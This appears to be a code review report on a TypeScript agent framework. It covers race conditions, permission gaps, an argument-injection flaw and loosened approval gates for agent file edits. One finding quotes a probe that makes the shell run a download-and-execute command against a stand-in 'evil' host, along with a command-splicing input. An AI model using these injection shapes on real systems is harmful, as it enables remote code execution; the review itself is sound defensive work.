- **Recommended action:** Re-check protection for the single candidate immediately before `rmSync` — a pointer read plus one `sessionHasWriter(candidate.transcript)` is O(1) and does not require re-running `protectedTranscripts` over the whole project. Keep the pre-loop snapshot as the cheap filter. Add `test_a_session_that_takes_a_lease_while_the_sweep_awaits_candidate_k_survives()` using a remover that blocks on a barrier the test controls, creating the `.writer.lock` while the barrier is held. Until the re-check exists, correct the comment at :268-270 — it currently states a guarantee the code stopped providing in this slice.


### F-dom-2: `deleteSession` still has check → await → unlink with no re-check, and unlike the sweep it has no backstop of any kind. The protection read at :226 decides, then control leaves the function for up to 30s (default) or forever (explicit `Infinity`), then :272 unlinks. A session that becomes protected during the await is deleted anyway and `SessionInUseError` never fires.


- **Found by:** review-crossval-4-6-absorption-domain-concurrency
- **File:** `packages/agents/src/session/session-lifecycle.ts` line 226
- **Plan reference:** T2.2 — deleteSession widened to async; ADR D6 "fix the shape at the framework"
- **Domain anchor:** session-lifecycle.ts:58-71 SessionInUseError — "Deleting it would discard state something is still using"; transcript-gc.ts:33 invariant 3
- **Evidence:**

  ```ts
  // session-lifecycle.ts:225-228   <-- CHECK
  if (options.force !== true) {
    const reason = protectedTranscripts(options.cwd, root).get(sessionId)
    if (reason !== undefined) throw new SessionInUseError(sessionId, reason)
  }
  // session-lifecycle.ts:255-259   <-- YIELD
  const outcome = await awaitRegistryRemoval(
    options.removeFromRegistry(sessionId), sessionId, options.registryTimeoutMs)
  // session-lifecycle.ts:272       <-- USE
  rmSync(transcriptPath(root, options.cwd, sessionId))
  ```
  Test coverage of the combination is still zero, and it is zero for a structural reason:
    - `packages/agents/tests/unit/gc-registry-remover.test.ts` — all seven `deleteSession` cases
      (:55, :72, :84, :106, :123, :136, :159) pass `force: true`, which skips :225-228 entirely.
    - `packages/agents/tests/unit/session-lifecycle.test.ts:186` and `:200` exercise the
      protected path but pass NO `removeFromRegistry`, so there is no await between check and
      unlink.
  So the protected path and the async path are each tested, and their intersection — the only
  place the defect lives — is tested by nothing.

- **Recommended action:** When `force !== true`, re-read protection for `sessionId` after the await and before `rmSync`, and throw `SessionInUseError` on the late acquisition. The transcript is still on disk at that point, so this is the recoverable direction and costs one pointer read plus one `sessionHasWriter`. Note the registry entry is already gone by then — the thrown error should say so (or the result shape should carry `registryRemoved: true` alongside the refusal), because silently reporting "in use" after having removed the registry entry would hide a half-applied delete. Add the barrier regression test.


### F-dom-6: The new recorded-cwd branch proves `dead` from the FIRST transcript in the directory whose recorded cwd re-encodes to the directory name — but the module's own opening premise is that a directory name can belong to MORE THAN ONE cwd. One transcript's cwd being gone proves the absence of that cwd, not of the directory, and the caller deletes the directory. The 3-of-N sampling (`slice(0, samples)`) makes the evidence partial by construction on any project with more than three transcripts.


- **Found by:** review-crossval-4-6-absorption-domain-concurrency
- **File:** `packages/agents/src/session/liveness-oracle.ts` line 181
- **Plan reference:** T3.2 — the liveness question comes home to the package that made it hard
- **Domain anchor:** liveness-oracle.ts:4-7 — "`/a/b` and `/a-b` produce the same name, so a directory name cannot be turned back into a path"; liveness-oracle.ts:25-28 — "Callers DELETE on `dead`"
- **Evidence:**

  ```ts
  // liveness-oracle.ts:167-183
  const samples = opts.transcriptSamples ?? DEFAULT_TRANSCRIPT_SAMPLES        // 3
  for (const file of entries.filter((f) => f.endsWith('.jsonl')).slice(0, samples)) {
    ...
    if (encodeProjectDir(cwd) === name) return { kind: 'found', cwd }         // :181 FIRST match wins
  }
  // liveness-oracle.ts:269-276
  at.found ? { liveness: 'alive', ... }
           : { liveness: 'dead', reason: `recorded cwd ${recorded.cwd} is gone` }
  ```
  The check at :181 is described as the guard against a stray transcript speaking for a project
  ("The recorded cwd MUST encode back to the directory it was found in", :151-153) — and it is
  exactly the check that CANNOT distinguish two legitimate cwds that encode to the same name,
  because both satisfy it.
  Tests: `liveness-oracle-recorded-cwd.test.ts:119`
  ("test_a_recorded_cwd_that_is_gone_is_the_one_thing_that_proves_dead") seeds a directory with
  ONE transcript. `:138` ("test_a_transcript_whose_cwd_does_not_encode_to_this_name_is_ignored")
  covers the stray-transcript case, which is the case the check DOES handle. No test puts two
  transcripts with two DIFFERENT cwds that both encode to the directory name in the same directory.
  Note the changeset claim this falsifies: `.changeset/liveness-oracle-recorded-cwd-major.md` —
  "A `dead` verdict now requires positive evidence of absence."

- **Recommended action:** Make `dead` require that EVERY distinct recorded cwd found in the directory is absent, and make the sampling honest: if `entries.filter(.jsonl).length > samples`, the evidence is partial, so the strongest available verdict is `undetermined` unless every sampled cwd is absent AND the sample covered the directory. Concretely: collect the set of matching cwds across the samples, probe each, return `alive` on the first hit, `dead` only when all are absent and no sample was skipped, `undetermined` otherwise. Add `test_two_cwds_that_encode_to_the_same_directory_are_not_dead_when_one_still_exists()`.


### F-dom-9: The previous review's F-dom-4 is NOT closed. `opts.budget` is still assigned unvalidated at :126, so a non-finite budget disables every `remaining <= 0` guard and reproduces the 64M-syscall unbounded sweep the module exists to prevent. Re-verified against current source.


- **Found by:** review-crossval-4-6-absorption-domain-concurrency
- **File:** `packages/agents/src/session/liveness-oracle.ts` line 126
- **Plan reference:** T3.2 Acceptance Criteria — "budget shared across the sweep"; Risk R5
- **Domain anchor:** liveness-oracle.ts:29-32 — "The budget is shared across the whole sweep, not per project. A bound that resets each iteration is not a bound"
- **Evidence:**

  ```ts
  // liveness-oracle.ts:125-126
  const out = new Map<string, LivenessVerdict>()
  let remaining = opts.budget          // no validation, unchanged since the previous review
  ```
  Sibling precedent in the same slice that DOES validate: transcript-gc.ts:164-169
  (`!Number.isFinite(options.keepLast)` → `GCFloorError`).
  Direction note (unchanged): 0 or negative degrades safely to `undetermined`; only non-finite
  fails open.

- **Recommended action:** Refuse at the boundary, matching `GCFloorError`'s posture: `if (!Number.isInteger(opts.budget) || opts.budget < 1) throw new <TypedError>(...)`. Add `test_a_non_finite_budget_is_refused_not_honoured()`. Related, already recorded in the artifact itself: `_budget_sizing_finding` notes an undersized budget degrades 7 967 projects to `undetermined` SILENTLY (agreement fell to 66,2%). A sweep that stops classifying and says nothing is the same class of defect one size smaller — emit an aggregate warning when the budget is exhausted before the input is.


### F-dom-1: T2.4's 0o700 in appendJsonl is dead on the primary path. FsSessionStore creates the SAME directory — and every ancestor, including ~/.theokit itself — with a bare recursive mkdir at :117 and :166, and both run BEFORE appendJsonl. Under umask 002 the shared credential root is born 0775 and is never repaired, which is exactly the shape T2.4 set out to eliminate.

- **Found by:** review-crossval-4-6-absorption-domain-security
- **File:** `../theokit-sdk/packages/sdk/src/internal/persistence/fs-session-store.ts` line 117
- **Plan reference:** T2.4 — "the transcript root was born writable by other users"; Q3 proposal "route the remaining creators through ensureSecureDir"
- **Domain anchor:** T2.4's own commit messages (SDK 7cb57baff / theokit 10577fe3): "the mode argument is a no-op on an existing directory, so the permissions belong to whichever code path created it first ... Fixing one creator therefore fixes nothing — the guarantee has to hold for all of them." SDK credential-store.ts:117-121 — "a writable dir lets an attacker replace the credential file with a symlink to their own 0600 file."
- **Evidence:**

  Two unhardened creators of the very directory T2.4 hardened, in the same repo:
  
  ```ts
  // fs-session-store.ts:112-145  appendRecords
  const path = transcriptPath(this.#baseDir, this.#cwd, agentId);
  await mkdir(dirname(path), { recursive: true });   // <-- no mode; runs FIRST
  await withFileLock(path, async () => {
    for (const record of records) appendJsonl(path, record);  // <-- T2.4's mode:0o700, too late
  });
  
  // fs-session-store.ts:164-168  acquire()  — runs even earlier, at session init
  const path = transcriptPath(this.#baseDir, this.#cwd, agentId);
  await mkdir(dirname(path), { recursive: true });   // <-- no mode
  ```
  `#baseDir` defaults to `transcriptRoot()` = `~/.theokit` (session-transcript.ts:339-343), and a
  recursive mkdir creates every missing ancestor with the same mode — so `~/.theokit` and
  `~/.theokit/projects` are created here too.
  
  MEASURED (node, umask 002, this machine):
    after fs-session-store mkdir : 775   ~/.theokit: 775
    after appendJsonl T2.4 fix   : 775   ~/.theokit: 775
  The 0o700 argument is a no-op on the already-created tree — the exact sentence T2.4's own
  commit message uses to justify the fix.
  
  Why 0775 on `~/.theokit` is not merely a transcript-privacy issue:
    * credential-store.ts:41-49 — `credentialHome` IS `~/.theokit` (dirName ".theokit",
      openai-chatgpt.ts:30). `assertSecureModes` (credential-store.ts:122-129) THROWS on it, so
      an auth read fails on a machine where the session path won the race — the
      self-inconsistency Q3 named, still live.
    * providers/discovery.ts:38 — `~/.theokit/plugins/trusted-providers.json` is the allowlist
      that gates `await import(pathToFileURL(indexPath).href)` at discovery.ts:125, i.e.
      arbitrary code execution in the agent process. That file is read with NO mode check
      (loadTrustedNames, discovery.ts:48-88). A group-writable `~/.theokit` lets another local
      user create `plugins/`, write the allowlist and drop the plugin body.
  
  T2.4's regression test cannot see this: transcript-dir-mode.test.ts:33 calls `appendJsonl`
  directly, never through `FsSessionStore`, so it is green while the shipped path is defeated.

- **Recommended action:** Give both call sites the same treatment as appendJsonl — mkdir(dirname(path), { recursive: true, mode: 0o700 }) at fs-session-store.ts:117 and :166 — and add a test that drives FsSessionStore.acquire()/appendRecords() (not appendJsonl) under a forced umask, asserting mode & 0o022 === 0 on BOTH the leaf and the baseDir root. Better still, give one owner responsibility for creating anything under transcriptRoot() so a future creator cannot reopen it silently. Until the root itself is guaranteed, assertSecureModes should also gate the read of trusted-providers.json (discovery.ts:48), which today trusts a file whose directory nothing checks.

### F-dom-2: STILL OPEN, and now published. The OAuth refresh-token store writes through atomicWriteJson, whose parent-directory mkdir carries no mode (atomic-write.ts:247), so ~/.theokit can be born 0775; the file's 0o600 buys nothing inside a directory another local user can write. The read path has no mode gate at all, unlike its credential sibling. T1.3 exports both functions as @theokit/sdk/mcp-auth.

- **Found by:** review-crossval-4-6-absorption-domain-security
- **File:** `../theokit-sdk/packages/sdk/src/internal/mcp/token-storage.ts` line 77
- **Plan reference:** T1.3 (publish the MCP OAuth subpath) + T2.4 / Q3 — "route the remaining creators through ensureSecureDir"
- **Domain anchor:** SDK credential-store.ts:117-121 and :122-137 (0700 dir / 0600 file, enforced on the READ path via assertSecureModes)
- **Evidence:**

  ```ts
  // token-storage.ts:22
  const FILE_PATH = join(homedir(), ".theokit", "mcp-tokens.json");
  // token-storage.ts:77-79
  await atomicWriteJson(FILE_PATH, allTokens);
  try { chmodSync(FILE_PATH, 0o600); } catch { /* windows */ }
  ```
  ```ts
  // internal/persistence/atomic-write.ts:247 — no mode, unlike jsonl.ts:142 which T2.4 fixed
  await mkdir(dirname(filePath), { recursive: true });
  ```
  Three gaps on one now-public path:
    1. Directory mode: as above. Same root as F-dom-1; second unhardened creator.
    2. Read path: getTokens (token-storage.ts:90-106) parses the bundle with no
       assertSecureModes; the sibling readAuthFile calls it at credential-store.ts:193.
    3. Order: chmodSync runs AFTER atomicWriteJson, so the file exists at the umask mode for a
       window.
  
  Now shipped as public API — packages/sdk/src/mcp-auth.ts:16-21 re-exports getTokens and
  setTokens, and packages/sdk/package.json:241-250 maps "./mcp-auth" to dist.
  
  No token VALUE appears in any log or diagnostic on this path — verified; the diag at
  token-storage.ts:39 names the file path and the keytar remedy only.

- **Recommended action:** Add an optional dirMode to atomicWriteJson/atomicWriteText and have setTokens pass 0o700, or route setTokens through the same ensureSecureDir shape as packages/agents/src/hooks/secure-store.ts:54. Add assertSecureModes(dirname(FILE_PATH), FILE_PATH) at the top of the file branch of getTokens. Do both before the publish that carries ./mcp-auth — an exported credential helper is a promise about how the credential is kept.

### F-dom-3: `dead` — the verdict that deletes — is decided from the FIRST sampled transcript whose recorded cwd encodes to the directory name, and the module's own preamble says that encoding is many-to-one. One transcript belonging to a deleted colliding cwd therefore condemns the directory a LIVE project is still using, without the module ever consulting the candidate pool that contains it.

- **Found by:** review-crossval-4-6-absorption-domain-security
- **File:** `packages/agents/src/session/liveness-oracle.ts` line 181
- **Plan reference:** T3.2 — "the liveness question comes home to the package that made it hard"; fix commit 7fea1388
- **Domain anchor:** liveness-oracle.ts:4-6 — "encodeProjectDir(cwd) is a one-way street. /a/b and /a-b produce the same name"; :25-28 — "Callers DELETE on dead ... deleting on 'could not tell' is data loss"; rules/error-handling.md 2 (validate inputs at the system boundary)
- **Evidence:**

  ```ts
  // liveness-oracle.ts:168-183 — first match wins, sample window default 3
  for (const file of entries.filter((f) => f.endsWith('.jsonl')).slice(0, samples)) {
    ...
    if (encodeProjectDir(cwd) === name) return { kind: 'found', cwd }   // <- short-circuits
  }
  // :260-276 — the only path that can produce `dead`
  if (recorded.kind === 'found') { const at = probe(recorded.cwd); ...
    : { liveness: 'dead', reason: `recorded cwd ${recorded.cwd} is gone` } }
  ```
  MEASURED against the real module (vitest probe, since deleted):
  
    case 1 — two cwds that collide by construction
      live = /home/op/my-app   (exists, and IS in candidatePaths)
      gone = /home/op/my/app   (deleted)   encode(gone) === encode(live)
      readdir yields the gone one first
      verdict: { liveness: 'dead', reason: 'recorded cwd /home/op/my/app is gone' }
  
    case 2 — a planted transcript whose recorded cwd merely encodes the same way
      planted cwd = '_home_op_my_app'   (never existed)
      verdict: { liveness: 'dead', reason: 'recorded cwd _home_op_my_app is gone' }
  
  Both return `dead` while the live project exists and is present in the candidate pool — the
  pool is never reached, because the recorded-cwd branch `continue`s the outer loop at :277.
  This is a narrower re-entry of the defect 7fea1388 exists to fix ("6 of 6 live projects
  classified dead, on the path where the caller DELETES").
  
  On the trust boundary, as asked: ~/.theokit/projects/<enc>/*.jsonl is DATA, not a fact about
  the system — the file is user-writable, and under F-dom-1 it can be group-writable. The
  docstring at :152-153 states the encode-back check's purpose ("a stray or copied transcript
  would speak for a project it never belonged to") but never states that the input is
  attacker-influenceable, and the check is NOT sufficient for what it is asked to decide: it
  constrains the recorded cwd to the same equivalence class, which by :4-6 has many members.
  One planted file, sampled first, is enough — case 2.
  
  On "can any path in the module delete": no. FsSeam is exists/listEntries/firstLine only, and
  the module performs no write or unlink. The exposure is entirely in the verdict handed to a
  caller the module instructs to delete.

- **Recommended action:** Require exhaustive evidence rather than first-match: `dead` should hold only when EVERY distinct recorded cwd found across the sampled transcripts is absent, and should degrade to `undetermined` when the samples disagree or when the sample window truncated the listing. State the trust boundary in the docstring ("the recorded cwd is data from a user-writable file; the encode-back check narrows it to the collision class, which is not a single path"). Add both cases as regression tests — neither exists in liveness-oracle-recorded-cwd.test.ts, whose closest case (:138) only covers a cwd that encodes to a DIFFERENT name.

### F-dom-4: The module's headline security claim is false as written. Line 22 says the inertness property is "structural now, not filtered: there is no later scan to escape into" — but argument substitution at :120 produces a string that IS scanned again at :133, so an ARGUMENT can introduce a shell segment into a template that contained none, and can splice a second command inside one that did. The boundary is real for file content and shell output; it is narrower than the claim, and the gap is the injection direction. Under G10 the defect is the claim.

- **Found by:** review-crossval-4-6-absorption-domain-security
- **File:** `packages/agents/src/config/command-template.ts` line 22
- **Plan reference:** T3.3 — "a custom command is now interpreted by the package that reads it"
- **Domain anchor:** rules/system-design-guardrails.md G10 (honest enforcement — never claim a control the code does not provide)
- **Evidence:**

  ```ts
  // command-template.ts:18-22
  // **Shell and file references are resolved in ONE scan ...**
  // The property is structural now, not filtered: there is no later scan to escape into.
  ```
  ```ts
  // :120-130   pass 1 — arguments substituted into the template
  const withArgs = await replaceAsync(template, PLACEHOLDER_REGEX, ...)
  // :133       pass 2 — the RESULT of pass 1 is scanned for shell and file references
  return replaceAsync(withArgs, REFERENCE_REGEX, async (match) => { ... deps.shell(command) })
  ```
  MEASURED against the real module (vitest probe, since deleted):
  
    A — an argument INTRODUCES a shell segment into a template that had none
        template: 'Summarize: $1'
        rawArgs : a quoted argument whose body is a backticked shell reference
        deps.shell called with: 'curl http://evil/x | sh'
  
    B — a QUOTED argument concatenates a second command inside an existing segment
        template: '!`git diff $1`'
        rawArgs : '"HEAD; <destructive command>"'
        deps.shell called with: 'git diff HEAD; <destructive command>'
  
  In B, quoting — the user's intuitive escaping — is what enables it: ARGS_REGEX (:38) treats the
  quoted run as one token and QUOTE_TRIM_REGEX (:39) strips the quotes before the value is
  spliced UNQUOTED into the shell string.
  
  The justification at :24-27 ("arguments are the user's direct input for THIS invocation") is an
  assumption about the caller that the module cannot enforce, does not test and offers no way to
  opt out of. It also does not cover A: there the template author wrote a purely textual command,
  so a reviewer approving that command has no way to know it can execute shell. The trust gate
  that DOES exist (custom-commands.ts:117-127, projectTrusted) gates loading the body, not the
  arguments — a trusted no-shell template is still an execution surface.
  
  No test covers either shape: the only case in the "deliberate re-scan" describe block
  (command-template.test.ts:187-196) asserts the benign direction, and nothing asserts a boundary.

- **Recommended action:** Pick one and make the file say it. Either (a) narrow the claim at :18-22 to what holds — file content and shell output are inert; ARGUMENTS are re-scanned and can both introduce and extend a shell segment — and add both cases as tests naming that as accepted behaviour with the caller obligation spelled out; or (b) close it: substitute arguments in the SAME scan as references so an argument's bytes are never re-matched, or add an opt-out (allowArgumentReferences?: boolean, default false) for callers whose arguments are not keyboard input. Leaving the strong claim above the weaker behaviour is the G10 failure itself.

### F-dom-5: STILL OPEN, verbatim. The absorbed default write-scoped set is three tools where the only real consumer's is one, so adopting the framework symbol widens an approval gate: edit_file stops requiring a human in auto-edit, with no sandbox posture required at all. Nothing in the branch — test, changeset or CHANGELOG — records the widening.

- **Found by:** review-crossval-4-6-absorption-domain-security
- **File:** `packages/agents/src/bridge/approval-decision.ts` line 52
- **Plan reference:** ADR D5 — "absorb the consumer's scar tissue, not its interface"; T2.1 / T5.1
- **Domain anchor:** Baseline Context invariant for packages/tui/src/consent/approval-mode.ts — "auto-edit stays bounded by the tool's write scope"; rules/error-handling.md 2 (fail-closed)
- **Evidence:**

  ```ts
  // packages/agents/src/bridge/approval-decision.ts:52-56  (unchanged since the prior review)
  export const WRITE_SCOPED_TOOLS: ReadonlySet<string> = new Set([
    'apply_patch', 'edit_file', 'write_file',
  ])
  ```
  Consumer being replaced (TheoCode/packages/tui/src/consent/approval-mode.ts:5):
    const EDIT_TOOLS = new Set(['apply_patch'])
  and it DOES register the extra name (TheoCode/packages/agent/src/tools/registry.ts:90-91).
  
  The widening is still asserted as intended, with no posture argument
  (packages/agents/tests/unit/approval-decision.test.ts:68-70):
    expect(shouldAutoApprove('auto-edit', 'edit_file')).toBe(true)
    expect(shouldAutoApprove('auto-edit', 'write_file')).toBe(true)
  and :95-103 pins the three-name default as correct.
  
  Re-verified on the current tree: .changeset/ holds only
  liveness-oracle-recorded-cwd-major.md and session-lifecycle-async-major.md — neither mentions
  approval; grep for auto-edit / edit_file in packages/agents/CHANGELOG.md returns nothing for
  this release. The writeScopedTools escape hatch (:59-61) exists, but nothing requires T5.1's
  adoption to use it.

- **Recommended action:** Ship the default as the measured consumer semantics (new Set(['apply_patch'])) and let a product widen it explicitly; or keep the three and make T5.1's adoption pass { writeScopedTools: new Set(['apply_patch']) } with a regression test in TheoCode pinning that edit_file still prompts. Either way record it under Security/Changed in packages/agents/CHANGELOG.md — a widened approval gate is consumer-visible.

### F-tests-B: The rewrite MOVED the "unreadable" test onto a different branch and left the original branch untested. A stat error on the resolved path is no longer asserted anywhere. Mutation-proven: making `fs.exists` errors read as "absent" — which turns a live project into `dead`, i.e. deletion — leaves all 19 tests green, while the PRE-rewrite suite caught the same mutation. This is the single defect class the commit exists to prevent, and its guard was lost in the rewrite.


- **Found by:** review-crossval-4-6-absorption-tests
- **File:** `packages/agents/tests/unit/liveness-oracle.test.ts` line 180
- **Plan reference:** rules/testing.md § 4.1 (negative cases prove error handling); rules/error-handling.md; T3.2 Deep Dives ("undetermined is NOT a soft dead")
- **Evidence:**

  Mutation applied to packages/agents/src/session/liveness-oracle.ts:138
    -      return { error: error instanceof Error ? error.message : String(error) }
    +      void error; return { found: false }
  
  POST-rewrite suite (HEAD):
    npx vitest run tests/unit/liveness-oracle.test.ts tests/unit/liveness-oracle-recorded-cwd.test.ts
    Test Files 2 passed (2) | Tests 19 passed (19)      <-- mutant SURVIVES
  
  PRE-rewrite suite + PRE-rewrite module (extracted from 7fea1388^ into a scratch root):
    FAIL tests/unit/liveness-oracle.test.ts >
         test_an_unreadable_directory_is_undetermined_with_a_reason
    AssertionError: expected "undetermined" to be "dead"   [reported as Expected
    "undetermined" / Received "dead"] at line 111
    Test Files 1 failed (1) | Tests 1 failed | 9 passed (10)   <-- mutant CAUGHT
  
  Root cause: pre-rewrite the test threw on `exists('/home/p/locked')`, which drove
  `probe()` (line 138). Post-rewrite (line 181-183) it throws on `listEntries(dir)`
  instead, driving a NEW branch (line 164) and leaving `probe`'s catch dead.
  
  v8 branch coverage of the module under both suites is 79.54%; uncovered statements are
  lines 138, 169, 177, 180, 221, 263, 267 — i.e. every stat-error branch on the delete path:
    :138  probe()'s catch                                  (never reached)
    :221  "could not stat {candidate}"  in searchPool       (never reached)
    :263  "could not stat {recorded.cwd}" after a found cwd (never reached)
  Line 263 is the one that matters most: it is the single guard standing between "EACCES
  while stat'ing the recorded cwd" and the `dead` verdict two lines below at :273.

- **Recommended action:** Add two negative-case tests, both on the destructive path — (1) recorded cwd found and `exists` throws EACCES -> undetermined with the errno and the path in `reason`, never dead; (2) a matching candidate in the pool whose `exists` throws -> undetermined. Assert the real message, as the pre-rewrite test did.


### F-tests-C: The plan's Goal-metric register hard-fails in CI. `test_gap_22` requires ../theokit-tui/dist/index.d.ts, and the CI workflow clones only theokit-sdk — never theokit-tui. The predecessor register handles the identical situation by skipping loudly (noteSkip G12); the new one asserts existsSync(...) === true unconditionally.


- **Found by:** review-crossval-4-6-absorption-tests
- **File:** `tests/integration/crossval-4-6-closure.test.ts` line 192
- **Plan reference:** Goal ("17/17 closure assertions"); rules/testing.md § 3 (tests MUST be deterministic)
- **Evidence:**

  tests/integration/crossval-4-6-closure.test.ts:192-197
    const dts = join(REPO_ROOT, '..', 'theokit-tui', 'dist', 'index.d.ts')
    expect(existsSync(dts), 'theokit-tui is unbuilt').toBe(true)
  GAPS['22'] carries no `blockedBy`, so `blocked('22')` returns false and the assertion runs.
  
  .github/workflows/ci.yml:107-110 (test job) clones exactly one sibling:
    git clone --depth 1 https://github.com/usetheodev/theokit-sdk.git ../theokit-sdk
  No step clones or builds ../theokit-tui. `grep -n theokit-tui .github/workflows/ci.yml` -> 0 hits.
  
  Contrast, same condition, predecessor file: tests/integration/crossval-gaps.test.ts:756
  calls noteSkip(...) with "@theokit/tui is not installed here", which the EC-4 guard then
  reports by name — the pattern this repo settled on eight commits earlier.
  
  It passes locally only because ../theokit-tui happens to be checked out on this machine.

- **Recommended action:** Give gap 22 the same treatment as G12 — skip loudly with a recorded reason when the sibling is absent — or add theokit-tui to the CI clone step. Passing because of one developer's directory layout is the environment-dependence rules/testing.md § 3 forbids.


### F-wire-18: The register written during review to fix the Goal metric hands pillar (b) PASS to four symbols via `reachable()`, which regex-scans packages/agents/dist/*.d.ts for the NAME. It never imports the module and never calls the function. check_wiring.py scores PASS because the name occurs in a file under tests/integration/.

- **Found by:** review-crossval-4-6-absorption-wiring
- **File:** `tests/integration/crossval-4-6-closure.test.ts` line 125
- **Plan reference:** cycle-implement.md § Wiring triad, pillar (b) — "covers the boundary the unit test mocked"
- **Evidence:**

  :125-128  function reachable(name) { expect(SURFACE?.has(name)).toBe(true) }
            SURFACE comes from :99-120 agentsSurface(), which readFileSync's the built .d.ts and
            matchAll's a regex over the TEXT.
  Symbols whose only tests/integration/ reference is this shape:
    :153-154 reachable('shouldAutoApprove'); reachable('WRITE_SCOPED_TOOLS')   ← test name says
             "test_gap_17_the_auto_approve_rule_is_callable"; nothing is called
    :184     reachable('classifyProjects')
    :225     reachable('applyPosture')
  :187-195 gap 22 is weaker still — readFileSync of ../theokit-tui/dist/index.d.ts and
           `expect(text).toContain('toolPresentation')`, a substring match that a comment satisfies.
  Two independent proofs that the shape does not hold:
    (1) F-wire-15 — gap 21 is GREEN while classifyProjects' real call site is RED.
    (2) The oracle is a stale-able artifact: dist/*.d.ts is dated 18:00:43, the classifyProjects
        rewrite is 19:26. The register is currently green against types that predate the breaking
        change — the exact failure mode F-wire-1 was raised for, reproduced inside its own fix.
  This is F-wire-4's shape recurring in a new file, and it is the same criticism the earlier
  review made of F-wire-9's `typeof x === 'function'` subpath test.

- **Recommended action:** For gaps 17, 21, 28: import the symbol and call it with inputs whose answer differs by branch (shouldAutoApprove over all three ApprovalMode values × a write-scoped and a non-write-scoped tool name; applyPosture with an unenforced posture asserting the typed throw; classifyProjects per F-wire-15). Keep the `reachable()` assertions as a SEPARATE packaging check with a name that says so ("declared by the built surface"), so a shape check is never counted as an exercise.

### F-wire-19: The hand-written evidence file DOES satisfy the plan's named DoD line — the measurement is real, arithmetically self-consistent, and its safety-relevant number is the right one. It does NOT satisfy pillar (c), which asks for observability in production, not a one-off sweep. And it is mechanically inert: no task declares a metric, so check_wiring.py never reads the file and pillar (c) remains N/A for all 27 symbols.

- **Found by:** review-crossval-4-6-absorption-wiring
- **File:** `.wiring-evidence.json` line 3
- **Plan reference:** Global DoD line "Runtime-metric proof" (plan:2246) + cycle-implement.md § Wiring triad pillar (c)
- **Evidence:**

  Argued, not asserted. Three separate questions:
  
  (1) Is the measurement real, or fabricated to satisfy a grep?  REAL, on the balance of evidence.
      The confusion matrix sums exactly: 10252+3362+4+3+3 = 13624 = liveness_oracle_projects_classified;
      10252+3362+4 = 13618 = the agreement figure; 34139/13624 = 2.506 = ops_per_project. A
      fabricated file does not usually close its own arithmetic in three independent places. The
      file volunteers a FAILED first run (budget=20000 → 66.2% agreement, ops pinned at the ceiling)
      and files the finding, which is not the behaviour of a number invented to pass a gate. The
      anti-pattern I was told to hunt — a suspiciously low count — is inverted here: the magnitudes
      are large, specific and mutually constrained.
  
  (2) Does it satisfy plan:2246?  YES, on its own terms. That line asks for classification
      equivalence observed on the operator's real tree rather than inferred from a fixture, and
      that is what was run. It also states the honest limits itself
      (_provenance.honest_limits, :9-13): manual sweep, no test writes it, empty candidate pool.
  
  (3) Does it satisfy pillar (c)?  NO. cycle-implement.md defines pillar (c) as a "counter,
      histogram, or log line that lets ops see the new behavior in production. Without
      observability, the feature is invisible when it breaks." Nothing in the module emits one:
      `grep -n 'console\.|logger|metric|counter' packages/agents/src/session/liveness-oracle.ts`
      → 0 hits outside prose. The evidence file itself names the resulting blind spot:
      ":36 That degradation is SAFE … but SILENT: the sweep does almost nothing and no aggregate
      signal says why. Nothing in the module warns when the budget is undersized." A sweep that
      quietly stops finding anything and a sweep that finds nothing are indistinguishable to an
      operator — which is precisely the condition pillar (c) exists to make visible.
      Mechanically it is also inert: check_wiring.py:229-234 returns N/A when no metric is
      declared, and every task in the checkpoint still has `wiring.c` null or "n/a", so the file
      is never opened by any gate. Adding it changed no verdict.
  ../theokit-tui and ../theokit-sdk still have no .wiring-evidence.json (find, both repos, 0 hits).

- **Recommended action:** Do not re-label this as pillar (c) closed. Two separable follow-ups: (i) emit the aggregate the file says is missing — a verdict-count-by-liveness plus ops-vs-budget line from the sweep, and declare it as the metric so check_wiring actually consults the evidence; (ii) either promote the sweep to a script under scripts/ that a test can invoke on a seeded tree, or record pillar (c) as an explicit ADR-backed defer naming the release gate as the blocker. The current state is a documented deferral wearing the costume of evidence, and it should be allowed to say so.

### F-wire-20: Both new theokit-tui modules still ship beside the component that solves the same problem, and neither component was rewired. F-wire-6 from the previous review is unfixed, and pillar (b) is FAIL for every tui symbol by the checker's own run.

- **Found by:** review-crossval-4-6-absorption-wiring
- **File:** `../theokit-tui/src/index.ts` line 197
- **Plan reference:** T3.1 / T3.4 — D6 "Fix the shape at the framework, never at the call site"
- **Evidence:**

  check_wiring.py --project-root ../theokit-tui:
    toolPresentation           a: PASS (callers = src/tool-presentation.ts, src/index.ts)  b: FAIL
    DEFAULT_TOOL_PRESENTATION  a: PASS (same two)                                          b: FAIL
    keyboardHelpFor            a: PASS (callers = src/index.ts ONLY — the barrel)          b: FAIL
    reason for every b: "No tests/integration/ directory found in project"
  The b FAIL is partly a convention mismatch (that repo names its files tests/*.integration.test.ts
  rather than tests/integration/**), but the substantive answer is the same: `grep -rn` for each
  symbol across the repo returns only src/index.ts, the defining module, and a co-located UNIT
  test. No integration test exercises any of them.
  No component was rewired: src/keyboard-help.test.tsx:35 still renders
  `<KeyboardHelp shortcuts={DEFAULT_COMPOSER_SHORTCUTS} />` — the hardcoded literal keyboardHelpFor
  exists to replace. `grep -rn centred src/ | grep -v '\.test\.'` returns only select-list-model.ts's
  own definition and prose: the new anchor value has no in-package caller.
  The package now ships two sources of truth for each, and the new one has zero in-package consumer.

- **Recommended action:** Either rewire KeyboardHelp to derive from keyboardHelpFor and ToolCall to read toolPresentation (which would make pillar (a) real and delete the duplicate), or record both as `defer` naming T5.2, and add the missing test convention so check_wiring can see that repo at all.

### F-wire-21: The two gates this plan built are unreachable from CI. No GitHub workflow invokes `check:all`, `check:invention-reachability` or `check:changelog-closes`, so neither gate can fail a build. F-wire-8 is unfixed. This is pillar (a) at the system level: the code exists and the flow that would run it does not.

- **Found by:** review-crossval-4-6-absorption-wiring
- **File:** `package.json` line 33
- **Plan reference:** T4.1 / T4.3 — "a closure reaches the consumer by mechanism, not by coincidence"
- **Evidence:**

  $ grep -rn "check:all\|check:invention-reachability\|check:changelog-closes" .github/workflows/
    (no output; 11 workflow files present, including ci.yml and architecture-guards.yml)
  The only CI reach is tests/integration/tooling-gates-cli.test.ts, which asserts the gates exit 0:
    :42 expect(status, 'warn mode — findings must not fail the build').toBe(0)
    :55 expect(status).toBe(0)
  So today a finding cannot fail CI, and after the 2026-11-13 sunset promotes the gates to error
  mode nothing will run them as a gate either — the promotion will change a script no pipeline calls.

